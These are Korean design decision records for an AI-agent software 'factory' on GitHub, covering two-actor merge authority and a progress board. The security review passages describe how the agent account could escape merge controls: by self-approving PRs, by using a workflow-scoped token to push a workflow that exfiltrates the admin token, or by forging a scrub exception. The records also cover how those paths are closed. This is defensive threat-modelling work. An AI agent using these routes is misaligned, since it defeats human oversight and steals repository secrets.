3. **`gh pr review --approve`는 승인의 의미를 희석한다.** 머지 배우의 승인은 "사람이 diff를 읽었다"가 아니라 "L1의 모든 게이트가 통과했다"의 기계적 표현이다. 사람이 GitHub UI에서 approve 수를 보고 "누군가 읽었다"고 읽으면 오해다 — 그래서 승인 본문이 `factory: approved by the merge actor (two-actor mode, ADR-021)`로 자기 정체를 말한다.
4. **에이전트 배우가 admin이면 이 ADR 전체가 무효다.** 그 사실은 CI에서만 확인할 수 있고(위 5), 확인은 doctor가 도는 순간의 스냅샷이다 — 누군가 나중에 그 계정을 admin으로 올리면 **다음 sweeper 실행(최대 30분)까지** 아무도 모른다. r1 전까지는 그 doctor를 부르는 워크플로가 **아예 없었다**(그래서 이 한계는 "스냅샷이 오래됐다"가 아니라 "한 번도 찍힌 적이 없다"였다).
5. **에이전트 PAT의 스코프는 저장소 밖의 사실이다.** `tokens.agent-workflow-scope`는 `gh api -i user`의 `X-OAuth-Scopes`를 읽으므로 CI에서만 판정되고, 사람이 GitHub 설정에서 그 PAT에 `workflow`를 다시 붙이면 다음 sweeper 실행까지 아무도 모른다. 스코프가 붙어 있는 동안 에이전트는 `.github/workflows/<아무거나>.yml`을 자기 브랜치에 push해 **머지되지 않은 채로** 저장소 시크릿을 읽어 갈 수 있다(r1 MF-2 a).
6. **환경 시크릿은 플랜을 탄다.** `factory-merge` 환경의 배포 브랜치 정책은 GitHub Free의 private 저장소에서 지원되지 않는다 — 그때 부트스트랩은 note로 폴백(저장소 시크릿)과 그 위험을 말하고 넘어간다. 그 저장소에서 MF-2 b는 닫히지 않고, 남는 것은 `.github/**`의 L1 보호와 PAT 스코프뿐이다.
7. **`merge-token-scope`의 스크럽 예외는 여전히 템플릿을 고칠 수 있는 사람 앞에서 무력하다**(r1 finding 5). 이제 열쇠가 둘이지만(`id: scrub-artifacts` **그리고** 그 블록의 `run:`이 실제로 `scrub-artifacts.js`를 부른다) 둘 다 쓰고 뒤에 `claude`를 붙이는 스텝은 만들 수 있다. 그것을 막는 것은 린트가 아니라 L1이다: **템플릿과 설치된 워크플로는 `[protected].factory`**(`.github/**`·`templates/**`)라서 그 PR은 자동 머지되지 않고 사람이 diff를 읽고 머지한다 — 곧 이 예외는 **에이전트 PR로는 위조할 수 없다**.

**영향**: `factory/lib/bootstrap.js`(`MERGE_TOKEN_SECRET`·`isTwoActor`·모드별 `PROTECTION_BODY`·모드 note), `factory/lib/gh.js`(`approvePr`·`viewerLogin`·`collaboratorPermission`), `factory/lib/merge-stage.js`(단계 6b), `factory/bin/run-stage.js`(`twoActor`·`approvePr` dep), `factory/lib/yml-lint.js`(`merge-token-scope`, `lintWorkflow(text, { file })`), `factory/lib/doctor/factory.js`(`checkMergeAuthority`·`checkWorkflows`가 파일명을 넘긴다), `factory/bin/scrub-artifacts.js`(`SECRET_ENV`), `templates/factory/github/workflows/factory-merge.yml`(`FACTORY_TWO_ACTOR`·스크럽 env), `templates/factory/docs/factory/CHARTER.md`(머지 권한 절), 스펙 §4.4·§6.1, `README.md`, `templates/know-thy-build/harness.md`(doctor 체크 표). 테스트: `bootstrap.test.js`·`merge-stage.test.js`·`doctor-factory.test.js`·`yml-lint.test.js`·`scrub-artifacts.test.js`.

**소유자가 두 배우 모드를 켜기 위해 해야 하는 일** (팩토리가 대신할 수 없다 — 계정과 시크릿은 사람의 것이다):

1. **머신 유저 계정 하나**를 만들고(예: `<project>-factory-bot`) 저장소에 **write 협력자**로 초대한다 — `admin`도 `maintain`도 아니어야 한다(doctor의 `tokens.agent-is-admin`이 CI에서 확인한다).
2. 그 계정으로 로그인해 **classic PAT**을 발급한다 — 스코프는 **`repo` 하나뿐이다. `workflow`를 주지 않는다**(r1 MF-2 a). `workflow` 스코프가 붙으면 에이전트는 `.github/workflows/<아무거나>.yml`을 자기 브랜치에 push할 수 있고, 같은 저장소 브랜치에서 도는 워크플로에는 저장소 시크릿이 그대로 주어지므로 **아무 것도 머지되지 않은 채로** 머지 배우의 admin PAT이 빠져나간다. 스코프를 빼면 GitHub이 그 push 자체를 거부한다("refusing to allow a Personal Access Token to create or update workflow"). 잃는 것은 없다: 워크플로 변경은 어차피 사람이 머지하는 `factory:harness` PR의 몫이고, sweeper가 부르는 `gh workflow run`(Actions dispatch)은 classic **`repo`** 스코프로 충분하다 — `workflow` 스코프가 지배하는 것은 워크플로 파일의 **쓰기**이지 실행이 아니다. 값을 저장소 시크릿 **`FACTORY_BOT_TOKEN`**에 넣는다: `gh secret set FACTORY_BOT_TOKEN`.
3. **소유자 자신(또는 다른 admin 계정)**으로 두 번째 classic PAT을 발급한다 — 스코프 `repo`(+ 조직 저장소라면 `admin:org`는 필요 없다). **두 토큰은 반드시 서로 다른 계정의 것이어야 한다** — 같은 계정이면 승인이 422로 거부되고 머지 스테이지가 `needs-human`으로 선다(그 거부 메시지가 정확히 이 사실을 말한다).
4. `npx know-thy-build factory bootstrap`을 돌린다 — 시크릿 목록에서 두 배우 모드를 관측하고 (a) base 브랜치에 승인 1건 + **코드 오너 승인** 요건을 걸고, (b) `.github/CODEOWNERS`를 `* @<머지 배우>`로 쓰고, (c) `factory-merge` **환경**(기본 브랜치 배포만 허용)을 만든다. 출력의 note가 어느 모드인지·로그인을 어디에서 얻었는지·환경 생성이 실패했으면 무엇으로 폴백하는지를 말한다.
   - 부트스트랩이 `FACTORY_MERGE_TOKEN`을 로컬 env에서 보면 **그 토큰으로** `gh api user`를 물어 로그인을 정한다. 없으면 **지금 로그인한 gh 세션의 계정**을 쓰고 그 사실을 note로 말한다 — 그때는 CODEOWNERS를 눈으로 확인해야 한다.
5. **머지 토큰을 환경 시크릿으로 넣는다**(r1 MF-2 b): `gh secret set FACTORY_MERGE_TOKEN --env factory-merge`. 저장소 레벨에 같은 이름의 시크릿이 있으면 **지운다**(`gh secret delete FACTORY_MERGE_TOKEN`) — 저장소 시크릿은 같은 저장소의 **어느 브랜치에서 돌든** 워크플로에 주어지므로, 그것이 남아 있는 한 환경으로 옮긴 의미가 없다.
6. `.github/CODEOWNERS`를 **커밋하고 push한다.** GitHub은 CODEOWNERS를 **base 브랜치에서** 읽으므로, 머지되기 전까지 그 규칙은 아무 일도 하지 않는다.
7. `npx know-thy-build factory doctor`로 확인한다 — `tokens.two-actor` PASS · `protection.two-actor` PASS · `protection.codeowners`는 로컬에서 WARN("unverified until CI")이다. `tokens.agent-is-admin`·`tokens.agent-workflow-scope`도 로컬에서는 WARN이고, **다음 sweeper 실행의 `Doctor (merge authority)` 스텝**에서 실제 등급이 잡 요약에 찍힌다(그 스텝은 `continue-on-error: true`라 FAIL이 sweeping을 깨뜨리지 않는다).

(되돌리려면 `FACTORY_MERGE_TOKEN`을 지우고 `factory bootstrap`을 다시 돌린다 — 승인 요건과 코드 오너 요건이 빠지고 단일 배우 모드로 돌아간다. `.github/CODEOWNERS`는 남는데, 코드 오너 요건이 없으면 그 파일은 리뷰어 자동 요청 외에 아무 것도 강제하지 않는다.)

---

### ADR-021 fix round r1 (KTB-33 보안 재리뷰 판결) — 2026-09-14

4fa2c7f의 보안 리뷰가 "머지 권한은 에이전트가 도는 어느 스테이지에서도 도달 불가능하다"는 이 ADR의 표제 불변식이 **아직 참이 아니다**라고 판정했다. 두 경로가 열려 있었고(MF-1·MF-2), 그 설계를 뒤에서 받쳐야 할 검사(`tokens.agent-is-admin`)에는 **호출자가 없었다**. 소유자의 판결과 그 구현:

- **MF-1 — 승인은 수가 아니라 신원이다.** `required_approving_review_count: 1`은 "작성자가 아닌 누군가"만 요구한다. 에이전트 배우는 write 협력자이므로 **자기가 열지 않은** PR의 head에 커밋을 push하고(같은 저장소의 보호되지 않은 브랜치다) 스스로 approve한 뒤 머지할 수 있었다 — `gh pr review --approve`는 훅도 막지 않았다. 고침: 두 배우 모드의 보호 body에 `require_code_owner_reviews: true`, 그리고 `.github/CODEOWNERS`에 `* @<머지 배우 로그인>`(부트스트랩이 `gh api user`로 해석해 쓴다). 에이전트 로그인은 그 파일에 **있으면 안 된다** — doctor가 CI에서 봇 토큰의 `gh api user`로 자기 로그인을 알고 대조해 FAIL(`protection.codeowners`)한다. `.github/CODEOWNERS`는 `[protected].factory`에 들어가 사람 머지 전용이 된다.
- **MF-2 — 워크플로 스코프는 시크릿 탈취다.** (a) 에이전트 PAT에서 classic `workflow` 스코프를 **뺀다**(위 체크리스트 2번; doctor `tokens.agent-workflow-scope`가 CI에서 `X-OAuth-Scopes`로 확인한다 — 두 배우 모드 FAIL, 단일 배우 모드 WARN). **확인한 사실**: sweeper가 쓰는 `gh workflow run`은 Actions **dispatch** API이고 classic `repo` 스코프로 충분하다 — `workflow` 스코프는 워크플로 **파일의 쓰기**를 지배한다. 그래서 sweeper에 예외를 둘 필요가 없었다. (b) `FACTORY_MERGE_TOKEN`을 `factory-merge` **환경**(`deployment_branch_policy: { protected_branches: true, custom_branch_policies: false }`)으로 옮기고 머지 잡이 `environment: factory-merge`를 선언한다 — 에이전트 브랜치에서 시작한 잡은 그 값을 보지 못한다. 부트스트랩이 환경을 만들고(멱등), 지원하지 않는 플랜에서는 note로 폴백과 위험을 말한다. (c) `[protected].factory`와 CI deny를 `.github/workflows/factory-*.yml`에서 **`.github/**`**로 넓힌다 — 다른 이름의 워크플로 한 장이 L1/L2 어디에도 걸리지 않던 구멍을 닫는다. (d) `merge-token-scope`의 파일 범위 갈래는 이제 `.github/workflows/*.yml`을 **디렉터리에서 읽어** 전부 돈다(고정된 일곱 이름이 아니라) — 규칙의 넓이가 목록의 길이였던 문제.
- **finding 2 — doctor를 CI에서 실제로 돌린다.** sweeper에 `Doctor (merge authority)` 스텝(`node .factory/bin/doctor-ci.js`, 봇 토큰, `continue-on-error: true`)을 둔다. `factory doctor` 본체가 아니라 별도 bin인 이유는 셋이다: ① 판정 주체가 **에이전트 배우의 토큰**이어야 한다(머지 잡에서 돌리면 admin PAT을 보고 거짓 FAIL을 낸다), ② 설치된 트리에는 `cli/`가 없어 `lib/doctor/factory.js`가 로드조차 되지 않는다(그래서 머지 권한 판정을 `lib/doctor/merge-authority.js`로 떼어냈다), ③ `gh secret list`와 branch protection GET은 둘 다 **admin**을 요구한다 — 봇이 그것을 읽을 수 있다면 그 자체가 결함이므로 CI에서는 묻지 않고, 모드는 부트스트랩이 관측해 적어 둔 저장소 변수 `FACTORY_TWO_ACTOR`에서 읽는다(없으면 FAIL을 WARN으로 낮추고 그 이유를 말한다). 그리고 **로컬의 skip은 PASS가 아니라 WARN**이다("unverified until CI").
- **finding 5 — 스크럽 예외의 열쇠를 둘로.** 스텝이 `id: scrub-artifacts`를 선언하고 **그 블록의 `run:`이 실제로 `scrub-artifacts.js`를 실행**할 때만 예외다(예전에는 블록 어디든 그 문자열이 있으면 통과였다 — 스텝 이름도, 주석도, `node …scrub-artifacts.js && claude -p …`도). 위조 가능성의 잔여분은 위 알려진 한계 7이 명시한다.
- **finding 9 — "불가능"의 정확한 문장.** 위 "이제 권한으로 불가능한 것"의 첫 항목이 두 문장으로 갈라졌다.

**영향(r1)**: `factory/lib/bootstrap.js`(`require_code_owner_reviews`·`CODEOWNERS_PATH`·`codeownersContent`/`codeownersOwners`/`codeownersMentions`·`MERGE_ENVIRONMENT`·`TWO_ACTOR_VARIABLE`·`codeowners`/`environment` op), `factory/cli/bootstrap.js`(`resolveMergeActor`·파일 writer), `factory/lib/gh.js`(`putEnvironment`·`viewerScopes`), `factory/lib/doctor/merge-authority.js`(신규 — `doctor/factory.js`에서 분리), `factory/lib/doctor/factory.js`(`checkWorkflows`가 디렉터리를 읽는다·CODEOWNERS를 넘긴다), `factory/cli/doctor.js`(`root`/`exists`/`readFile` 전달), `factory/bin/doctor-ci.js`(신규), `factory/lib/yml-lint.js`(스크럽 예외 두 열쇠), `templates/factory/github/workflows/*.yml`(`id: scrub-artifacts` ×6, 머지 잡의 `environment:`, sweeper의 doctor 스텝), `templates/factory/factory/harness.toml`·`.factory/harness.toml`(`.github/**`), `templates/factory/factory/ci-settings{,-harness}.json`·설치본(`.github/**` deny), `templates/factory/docs/factory/CHARTER.md`, `factory/cli/init.js`(next steps), 스펙 §4.4·§6.1, `README.md`. 테스트: `bootstrap.test.js`·`doctor-factory.test.js`·`doctor-merge-authority.test.js`(신규)·`yml-lint.test.js`·`gh.test.js`·`templates.test.js`.

**r2 (KTB-33 finding MF-A)**: 두 배우 모드 판정은 이제 저장소 시크릿뿐 아니라 `factory-merge` 환경 시크릿도 본다(`gh.listEnvSecrets`, 404/미존재 환경은 `[]`) — 소유자 체크리스트가 시킨 대로 토큰을 환경으로 옮기고 저장소 사본을 지운 저장소도 두 배우 모드로 인식되고, 재부트스트랩이 코드 오너 요건을 지우지 않는다. 저장소 사본이 남아 있으면(환경에도 있든 없든) bootstrap이 note를, doctor가 `tokens.merge-token-repo-level`(WARN)을 남겨 지우라고 알린다.

---

## ADR-022 factory board — 진행 신호와 뷰어 — 2026-09-14

**질문**: 스테이지 하나가 8–35분을 돈다. 그동안 밖에서 볼 수 있는 것은 10분마다 갱신되는 하트비트 두 줄(`stage · runner · started · last`)뿐이다. 그 줄은 "살아 있다"는 말하지만 **무엇을 하고 있는지**는 한 글자도 말하지 않는다 — 지금 어느 스텝인지, 어떤 에이전트가 무엇을 읽고 있는지, 토큰을 얼마나 태웠는지. 소유자는 이슈별로 그것을 보고 싶어 하고, KTB를 설치한 **모든 저장소**에서 그래야 한다.

**관측**:
- 답은 이미 디스크에 있다. `claude -p`의 세션 JSONL은 러너의 홈에서 **한 줄씩 자라고**, 서브에이전트도 각자 트랜스크립트를 갖는다(`hooks/record-agents.sh`가 SubagentStart/Stop의 페이로드 전문을 `.factory/out/agents.jsonl`에 적어 두고, 그 안에 `agent_transcript_path`가 있다). 즉 진행 신호를 만들기 위해 에이전트에게 **아무것도 더 시키지 않아도 된다** — 이미 쓰고 있는 것을 읽기만 하면 된다.
- 러너 밖으로 나가는 실시간 채널은 하나다. 잡의 stdout은 잡이 끝나야 읽기 좋고, 아티팩트도 마찬가지다. **이슈 코멘트만이** 도는 중에 갱신되고 누구나 즉시 본다. 그리고 그 자리에는 이미 하트비트 코멘트가 있다.
- 실측(2026-09-14) 트랜스크립트 모양: assistant 줄이 `message.model`·`message.usage.{input_tokens, output_tokens, cache_read_input_tokens, cache_creation_input_tokens}`·`content[].tool_use{name, input}`을 싣는다. `type`은 `assistant`·`user`·`system`·`progress`를 포함해 십수 가지가 섞이고 버전마다 는다.
- 실측 훅 페이로드는 **일정하지 않다**. 어떤 버전은 Stop만, `{hook_event_name, agent_type, agent_transcript_path}`만 싣는다(`agent_id`도 `description`도 없다).

**결정**:

1. **`progress:v1`이 계약이다.** `factory/lib/progress.js`가 트랜스크립트들을 마지막으로 읽은 오프셋부터 이어 읽어(tail) 객체 하나로 접는다:
   `{stage, issue, runner, started, updated, step:{phase, label, since}, agents:[{label, kind, status, started, ended, last_tool, turns, input_tokens, output_tokens, cache_read_tokens, cost_usd}], totals:{…}, files_touched:[…]}`.
   이 객체는 하트비트 코멘트와 런 기록 양쪽에 **똑같은 마커**(`<!-- factory-progress:v1 {…} -->`) 한 줄로 실린다 — 그래서 뷰어는 도는 런과 끝난 런을 정규식 하나로 읽는다. 사람이 보는 표는 그 JSON에서 **파생될 뿐**이고, 둘이 어긋날 수 없도록 렌더러는 마커에 실제로 실린 객체만 본다.

2. **하트비트가 유일한 실시간 채널이고, 주기는 2분이다.** 10분은 "살아 있는가"에는 충분했지만 8분짜리 스테이지를 갱신 한 번으로 끝낸다. sweeper의 stale 임계는 30분이므로 2분은 15번을 놓쳐야 좀비 판정이 되는 넉넉한 예산이고, 이슈당 쓰기 17회는 API 한도에 비해 무시할 수 있다. 코멘트는 **언제나 같은 코멘트를 PATCH**한다(새 코멘트 금지 — 알림 폭탄). 본문이 바뀌지 않았으면 쓰지 않는다.

3. **관측 기능이 스테이지의 생명선을 끊지 못한다.** `progress()`가 던지면 그 주기는 **예전의 두 줄짜리 본문 그대로** 나간다. 이 폴백이 없으면 진행 읽기의 버그 하나가 하트비트를 멈추고, sweeper는 그것을 "런이 죽었다"로 읽어 **살아 있는** 스테이지를 재큐한다(R 예산을 태우고, 완성된 구현이 라벨 그래프에서 좌초한다 — ADR-020 MF-4가 정확히 그 사고다). 그래서 하트비트의 첫 두 줄은 **모양이 바뀌지 않는다**: `lib/sweeper.js`가 그것을 읽고, `heartbeat.test.js`의 SF-4 왕복 테스트가 두 쪽을 한 줄에 세워 둔다.

4. **크기와 비밀은 설계 제약이지 나중 일이 아니다.** 이 객체는 **공개 이슈 코멘트**로 나간다.
   - **`tool_result`는 파싱조차 하지 않는다.** 그 안에는 파일 전문·`env` 덤프·토큰이 그대로 들어 있다. `last_tool`은 `tool_use`의 **인자**에서만 만들고(경로·패턴·명령의 앞 60자), `prompt`·`content`·`new_string` 같은 큰 자유 텍스트 필드는 후보에서 아예 뺐다. 이 경계는 테스트가 지킨다.
   - GitHub 코멘트 상한은 64 KB다. 마커 JSON은 60 KB 예산 안에서 스스로 줄고, **버리는 순서가 정해져 있다**: `files_touched` → 에이전트를 뒤에서부터. `totals`는 절대 버리지 않는다 — 표가 비어도 "이 런이 얼마를 태웠나"는 남아야 한다. 에이전트는 40개, 파일은 30개에서 자르고, 잘렸다는 사실과 개수를 본문에 적는다(합계는 잘린 것까지 포함한다 — 표만 짧아지고 숫자는 거짓말하지 않는다).

5. **비용은 가격표 한 벌에서만 나온다.** 끝난 런의 비용은 `claude -p` 봉투가 말해 주지만(`total_cost_usd`), 도는 중인 런은 아무도 말해 주지 않는다 — 트랜스크립트에는 모델 이름과 토큰 수만 있다. 그래서 `lib/usage.js`에 모델별 list price를 두고(`MODEL_PRICES`/`modelPrice`/`costFromUsage`, 캐시는 읽기 0.1×·쓰기 1.25×) `progress.js`가 그것을 **불러 쓴다**. 표를 두 벌 두면 "라이브 $0.41 / 최종 $0.38"처럼 조용히 어긋난다. 모르는 모델은 `null`이고 비용은 0으로 더해진다 — 아무 가격이나 붙여 그럴듯한 숫자를 만드는 것보다 "비용 미상"이 낫다(`summarizeUsage`가 `n/a`를 합산에서 빼는 것과 같은 원칙).

6. **`step`은 최선의 추측이고, 그렇다고 말한다.** 지금 도는 서브에이전트 중 가장 늦게 시작한 것의 라벨이 스텝이고, `phase`는 그 라벨의 `:` 앞부분이다(`R1:architecture` → `R1`). 워크플로가 `phase('R1')`과 `label: 'R1:${name}'`을 같은 축으로 붙여 주기 때문에 성립한다(`workflows/factory-review.js`). `:`가 없는 라벨에는 phase를 **지어내지 않는다** — `null`이다.

7. **훅 페이로드의 어떤 키도 필수가 아니다.** 신원은 `agent_id` → 없으면 `agent_transcript_path`, 라벨은 `description`/`label` → 없으면 `agent_type`. 버전이 바뀌어 키가 사라지면 진행 표시가 성기어질 뿐, 아무것도 깨지지 않는다. 같은 원칙으로 **모르는 JSONL 줄 종류는 전부 조용히 건너뛴다**.

8. **러너 쪽 코드는 factory 파일이다.** `lib/progress.js`·`lib/heartbeat.js`는 `factory init`이 `.factory/lib/`로 미러링하는 파일이라, KTB를 설치한 모든 저장소가 자동으로 이 신호를 얻는다(self-mirror 테스트가 드리프트를 막는다).

**알려진 한계**: 오케스트레이터 트랜스크립트 경로는 훅이 `transcript_path`를 싣지 않는 버전에서 **추측**이다 — 스테이지가 도는 중이라 `session_id`를 아직 모르므로(봉투는 런이 끝나야 쓰인다) 이 cwd의 프로젝트 디렉터리에서 가장 최근에 수정된 `.jsonl`을 고른다. CI 러너에는 이 저장소의 세션이 하나뿐이라 정확하고, 로컬에서 사람이 같은 저장소로 딴 세션을 돌리고 있으면 그 세션을 볼 수 있다 — 진행 표시가 조금 틀릴 뿐 아무것도 깨뜨리지 않는 종류의 오차라 best-effort로 둔다.

**영향(Task A)**: `factory/lib/progress.js`(신규), `factory/lib/heartbeat.js`(본문 렌더링·2분 주기·변경 시에만 PATCH·폴백), `factory/lib/usage.js`(`MODEL_PRICES`/`modelPrice`/`costFromUsage`), `factory/bin/run-stage.js`(`progress` dep 배선, `usageLine(out, progress)`가 런 기록에 마커를 남긴다), `.factory/**` 미러, 스펙 §4.2.1 step 1, `README.md`. 테스트: `progress.test.js`(신규), `heartbeat.test.js`, `run-stage.test.js`.

### Task B — 뷰어 (`factory board` CLI + 자체 완결 HTML) — 2026-09-14

**질문**: Task A가 신호를 만들었지만 그 신호는 **이슈마다 흩어져 있다**. 소유자가 묻는 것은 "이슈 #7이 어디쯤인가"가 아니다: "지금 **모든** 이슈가 어디에 있고, 어느 스텝이 돌고, 어떤 에이전트가 무엇을 하고, 토큰을 얼마나 태웠는가 — KTB를 설치한 **모든 저장소**에 대해, 여러 이슈가 동시에 돌 때도." 그 화면을 무엇으로, 어디서 띄우는가?

**관측**:
- 재료는 전부 GitHub에 이미 있다: 상태=라벨, "언제부터"=전이 코멘트, "살아 있는가"=하트비트 첫 줄, "무엇을 하는가"=그 코멘트의 `progress:v1` 마커, "얼마"=기록 브랜치의 `usage:` 줄, "어느 잡"=`gh run list`. **새 신호는 하나도 필요 없다.**
- 그 재료를 읽으려면 **누군가의 자격증명**이 필요하다. 프라이빗 저장소가 기본이고, `factory/records` 브랜치는 특히 그렇다.
- 사람의 노트북에는 이미 인증된 `gh` CLI가 있다. 그것이 이 저장소에서 자격증명을 다루는 **유일하게 안전한 방법**이다 — 우리가 토큰을 읽지도, 저장하지도, 찍지도 않는다.
- 도는 런은 2분마다 갱신된다(결정 2). 그보다 자주 물어도 새 사실이 없다.

**결정**:

1. **로컬 CLI가 gh를 프록시한다.** `factory board`가 node `http`만으로(의존성 0) 세 개의 엔드포인트를 낸다 — `GET /`(페이지 파일 그대로), `GET /api/board`(모델 JSON), `GET /api/events`(SSE, **모델이 바뀔 때만** `board` 이벤트). 모든 GitHub 조회는 `gh api`·`gh issue list`·`gh run list`로 나간다: 토큰을 읽는 코드가 없으므로 새어 나갈 자리도 없고, 사람이 볼 수 있는 저장소는 전부 그대로 보인다. 서버는 `127.0.0.1`에만 바인딩한다.

2. **모델을 만드는 코드는 순수 함수 한 파일이다**(`lib/board.js`). gh·fs·시계를 만지지 않으므로(`now`는 인자다) 테스트가 픽스처 코멘트·런 기록·`gh run list` JSON만으로 모델 전체를 고정한다. 조회·캐시·HTTP는 `cli/board.js`에만 있다. **파서를 새로 쓰지 않는 것이 이 파일의 규칙이다** — `PROGRESS_MARKER_RE`·`TRANSITION_TO`·`TRANSITION_FAILED`·`BLOCKED_ORIGIN`·`parseRunRecord`·`parseHandoffs`를 전부 원래 주인에게서 가져다 쓴다. 뷰어가 자기 사본을 들면 "보드가 말하는 사실"과 "공장이 아는 사실"이 조용히 갈라진다.

3. **기록 브랜치는 `gh api` contents 엔드포인트로 읽는다**(`git fetch`+`git show`가 아니라). `lib/records-branch.js`의 방법은 **로컬 클론을 전제**하는데, 이 화면의 요구는 "설치한 모든 저장소"다 — `--repo owner/other`가 그 자리에서 동작해야 하고, 남의 저장소를 보려고 클론을 뜨게 하는 것은 뷰어가 할 짓이 아니다. 대신 디렉터리 목록을 한 번 받아 **blob sha**를 비교하고, 안 바뀐 기록은 본문을 다시 받지 않는다(기록은 스테이지가 끝날 때만 움직이므로 대부분의 주기에서 그 호출은 전부 생략된다).

4. **비용은 두 번 세지 않는다.** `finished_usd`는 기록 브랜치의 `usage:` 줄들, `live_usd`는 도는 런의 `progress.totals.cost_usd`다(가격표는 `lib/usage.js` 한 벌 — 결정 5). 하트비트 코멘트는 런이 끝나도 이슈에 그대로 남으므로, 같은 `runner`+`stage`의 기록 섹션이 이미 있으면 **그 런은 끝났고 기록이 진실**로 보고 라이브를 0으로 둔다. 러너를 모르면(로컬 실행) 더하는 쪽을 고르고 `progress_source`가 출처를 밝힌다.

5. **왜 아티팩트가 아닌가.** "잡이 HTML을 만들어 아티팩트로 올린다"가 가장 싸 보이지만 셋 다 틀린다: (a) 아티팩트는 **잡이 끝나야** 나온다 — 이 화면의 요구는 정확히 그 8–35분 **동안**이다. (b) 아티팩트는 한 저장소·한 잡의 산출물이라 여러 저장소를 한 화면에 모을 수 없다. (c) 아티팩트를 열려면 로그인하고 zip을 내려받아 풀어야 한다 — 2분마다 그러지는 않는다. 같은 이유로 "공장이 상태를 어딘가에 push한다"도 뺐다: 그건 새 쓰기 경로이고, 새 쓰기 경로는 새 실패 방식이다. **보드는 읽기 전용이어야 한다** — 관측이 관측 대상을 깨뜨리지 않는다(결정 3의 같은 원칙).

6. **페이지는 파일 하나이고, 두 모드로 열린다.** `templates/factory/docs/factory/board/index.html` — `factory init`이 설치하고 CLI가 **그 파일을 그대로** 낸다(두 벌이 되면 서버로 본 화면과 정적으로 연 화면이 달라진다 — 테스트가 바이트 동일성을 잡는다). 외부 리소스는 0이다(CDN·폰트·분석 전부 없음, 스모크 테스트가 검사한다).
   - **CLI 모드** — `/api/board` + SSE. 완전한 모델.
   - **정적 모드**(GitHub Pages·파일 열기) — `?repo=owner/name`이면 페이지가 `api.github.com`을 직접 부른다. 인증 없이 공개 저장소(시간당 60회, **남은 횟수를 화면에 띄운다**), 프라이빗은 localStorage에 담긴 개인 토큰으로. 이 모드의 모델은 **의도적으로 축소판**이다: 완료 런 비용을 합산하지 않고 칩에 `live`라고 적는다. 같은 합산을 두 벌 구현하면 "라이브 $0.41 / 최종 $0.38"로 어긋나고(결정 5가 경고한 바로 그 함정), 그 어긋남은 조용하다. 두 모드의 차이는 페이지 상단 도움말이 직접 설명한다.

7. **레인은 전이 그래프를 왼쪽에서 오른쪽으로 편 것이다** — queue · ready · planned · in-progress · awaiting-review · approved · merged. 카드가 오른쪽으로 가는 것 자체가 진척이다. `factory:rework`만 자기 열이 없다: 재작업은 **implement의 재진입**이지 새 단계가 아니라(`ENTRY_LABELS.implement`가 `planned`와 `rework`를 같은 진입 라벨로 묶는다) in-progress 열에 들어가고, 카드에는 진짜 상태 칩이 그대로 붙으므로 숨겨지는 사실이 없다. needs-human·blocked·needs-info는 **옆 레인**이다 — 사람 차례이거나 회수 중이라 흐름에서 빠져 있고, 같은 줄에 두면 "왼쪽→오른쪽"이라는 읽기가 깨진다. 상태 라벨이 0개인 이슈(KTB-30)는 `기타` 레인에 뜬다 — 그 이슈가 화면에서 사라지는 것이 원래의 사고였다.

8. **신선도 임계는 sweeper와 같은 숫자다.** fresh < 5분(주기 2분을 한 번 놓쳐도 정상) · stale < 30분 · 그 뒤 dead. **30분은 우연이 아니라 `lib/sweeper.js`의 stale 임계 그 값이다** — 보드가 "죽었다"고 부르는 순간과 공장이 좀비로 판정하는 순간이 어긋나면, 사람이 빨간 카드를 보는데 공장은 아직 아무것도 하지 않는 구간이 생긴다. `zombie-queued`는 다른 사고다: 잡이 10분 넘게 **큐에 앉아 있고** 하트비트가 한 줄도 없는 것 — 동시성 한도에 걸려 영영 시작하지 않는 런이 정확히 그 모양이고, 하트비트가 없으므로 sweeper의 좀비 판정에도 걸리지 않는다.

9. **런 매칭은 신원 먼저, 추측은 그렇다고 말한다.** 워크플로가 `FACTORY_RUNNER_ID: gha-${{ github.run_id }}`를 넘기고 하트비트가 그 값을 그대로 싣는다 — `gha-<databaseId>`는 **신원**이다(`matched_by: "runner"`). 하트비트가 아직 없는 런(=큐에 걸린 잡, 즉 사람이 꼭 봐야 하는 것)에는 쓸 수 없으므로 스테이지 워크플로 이름 + `displayTitle`로 떨어지고, 그때는 `matched_by: "workflow"`라고 **모델이 밝힌다**.

10. **갱신 주기 60초, 저장소당 캐시.** 하트비트가 2분 주기이므로 그보다 빨리 물어도 새 사실이 없다. 저장소 하나를 한 번 훑는 데 드는 gh 호출은 대략 `3 + 이슈 수`이고(+기록 본문은 sha가 움직일 때만), 60초면 REST 한도 5000/h 안에서 저장소 여러 개를 하루 종일 띄워 둘 수 있다. `/api/board`는 캐시가 유효하면 GitHub을 다시 묻지 않고, SSE는 **모델이 바뀔 때만** 민다.

**알려진 한계**: (a) 정적 모드의 모델은 축소판이고 페이지가 자기 사본의 정규식을 든다 — 그 사본이 낡으면 정적 모드만 조용히 성기어진다(CLI 모드는 영향 없다). (b) `matched_by: "workflow"`는 best-effort다: `gh run list`는 워크플로 입력을 싣지 않으므로 같은 제목의 이슈가 둘이면 틀릴 수 있다. (c) 코멘트 조회가 이슈당 한 번이라 이슈가 아주 많은 저장소에서는 첫 훑기가 느리다(라벨 없는 이슈는 24시간 창 + 20개로 막아 뒀다 — sweeper 8번 팔·`factory status`와 같은 창).

**영향(Task B)**: `factory/lib/board.js`(신규·순수), `factory/cli/board.js`(신규·서버와 조회), `factory/cli/index.js`(배선), `templates/factory/docs/factory/board/index.html`(신규·설치되는 페이지), `factory/lib/status.js`(마지막 줄의 board 힌트), `factory/cli/init.js`(next-steps), `.factory/**`·`docs/factory/board/**` 미러, `README.md`. 테스트: `board.test.js`·`board-cli.test.js`·`board-page.test.js`(신규), `status.test.js`.

**리뷰 714a45d 수정** (2026-09-14, `factory/cli/board.js`·`factory/lib/board-static.js`·`templates/factory/docs/factory/board/index.html`):
- `--host`는 loopback(`127.0.0.1`·`localhost`·`::1`)만 받는다 — 그 외 값은 exit 2, 결정 1을 이름으로 지목한 메시지로 거부한다. `/api/board`·`/api/events`에는 인증이 없으므로 이 검증이 없으면 `--host 0.0.0.0`이 프라이빗 이슈·핸드오프·비용을 같은 네트워크의 누구에게나 연다.
- 정적 모드는 GitHub 호출 예산을 스스로 지킨다: 남은 호출이 3 이하이고 아직 reset 전이면 폴 자체(이슈 목록 재조회까지)를 건너뛰고 헤더에 "API 예산 소진 — HH:MM 재시도"를 보여 준다.
- 정적 모드는 코멘트를 24시간 안에 갱신된 이슈에만 받는다(collectRepo의 라벨-없는-이슈 창과 같다) — 나머지는 라벨만으로 그리고 `stale-data`로 고발한다.
